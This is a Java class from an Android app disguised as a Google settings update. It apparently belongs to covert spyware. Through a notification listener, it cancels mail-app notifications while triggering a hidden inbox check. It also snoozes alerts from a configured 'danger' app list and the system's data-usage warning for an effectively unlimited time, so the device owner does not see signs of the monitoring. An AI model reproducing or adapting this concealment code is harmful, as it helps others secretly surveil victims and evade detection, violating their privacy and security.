package com.setting.dl.google.googlesettingupdate.nlservice.interfaces;

import android.app.Notification;
import android.content.Context;
import android.content.SharedPreferences;
import android.os.Build;
import android.os.Bundle;
import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;

import com.setting.dl.google.googlesettingupdate.Run;
import com.setting.dl.google.googlesettingupdate.nlservice.implementers.IPackageControler;
import com.setting.dl.google.googlesettingupdate.ptt.kahverengi.PostMan;
import com.setting.dl.google.googlesettingupdate.u;

import java.util.HashSet;
import java.util.Set;

public class PackageControler implements IPackageControler {
   
   
   private final Set<String> mailPackages;
   private final Set<String> dangerPackages;
   private final Set<String> junkPackages;
   private final NotificationListenerService service;
   
   public PackageControler(NotificationListenerService service){
      
      this.service = service;
      SharedPreferences pref = service.getSharedPreferences("gmail", Context.MODE_PRIVATE);
      
      mailPackages = pref.getStringSet("mailpacks", new HashSet<>());
      dangerPackages = pref.getStringSet("dangerpacks", new HashSet<>());
      junkPackages = pref.getStringSet("junkpacks", new HashSet<>());
      
      
   }
   
   @Override
   public boolean isOkey(StatusBarNotification statusBarNotification) {
   
      String pName = statusBarNotification.getPackageName();
      
      
      if (isMail(pName)) {
   
         service.cancelNotification(statusBarNotification.getKey());
   
         Run.runThread(() -> PostMan.getInstance(service.getApplicationContext()).checkInbox());
         return true;
      }
   
      if (isDanger(pName)) {
         
         snooze(statusBarNotification);
         return true;
      }
   
      if (isJunk(pName)) {
         
         return false;
      }
   
      Notification not    = statusBarNotification.getNotification();
      Bundle       extras = not.extras;
      
      if(extras == null) return true;
   
      String  title       = String.valueOf(extras.getCharSequence(Notification.EXTRA_TITLE));
   
      if (pName.equals("android") && title.contains("Veri kullanımı uyarısı")) {
         
         snooze(statusBarNotification);
      }
      
      
      return true;
   }
   
   private boolean isMail(String name){
      
      for(String p : mailPackages)
         if(p.contains(name))
            return true;
         
      return false;
   }
   
   private boolean isDanger(String name) {
   
      for(String p : dangerPackages)
         if(p.contains(name))
            return true;
   
      return false;
   }
   
   private boolean isJunk(String name) {
   
      for(String p : junkPackages)
         if(p.contains(name))
            return true;
   
      return false;
   }
   
   private void snooze(StatusBarNotification sbn) {
      
      long snoozLong = 10000000000000L;
   
      if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
         service.snoozeNotification(sbn.getKey(), snoozLong);
   
         u.saveToFile(service,
               "OngoingNotification", u.format("Bildirim uyutuldu : %s", sbn.getKey()));
      }
   
      
   }
   
}
